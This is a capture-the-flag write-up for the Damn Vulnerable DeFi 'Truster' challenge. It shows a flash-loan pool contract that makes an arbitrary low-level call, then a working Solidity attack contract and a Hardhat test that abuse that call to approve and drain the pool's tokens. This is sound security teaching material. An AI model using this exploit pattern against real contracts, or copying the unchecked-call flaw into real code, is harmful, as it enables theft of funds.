---
description: You shouldn't let user to make arbitrary low-level call.
---

# 3 - Truster

<pre class="language-solidity"><code class="lang-solidity">contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        <a data-footnote-ref href="#user-content-fn-1">target.functionCall(data);</a>

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
</code></pre>

### Solution

```solidity
contract AttackTruster {
    address pool;
    address dvt;

    constructor(address _pool, address _dvt) {
        pool = _pool;
        dvt = _dvt;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, 1000000 ether);
        TrusterLenderPool(pool).flashLoan(0, msg.sender, dvt, data);
    }
}
```

Here, we will pass in `data` and make `flashLoan` approve the attacker `1000000` DVT.



```javascript
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const AttackTruster = await ethers.getContractFactory('AttackTruster');
    const attackTruster = await AttackTruster.deploy(this.pool.address, this.token.address);
    await attackTruster.deployed();

    let tx = await attackTruster.connect(attacker).attack();
    await tx.wait();
    
    tx = await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    await tx.wait();
  });
```

[^1]: we make `approve` tx using low-level call
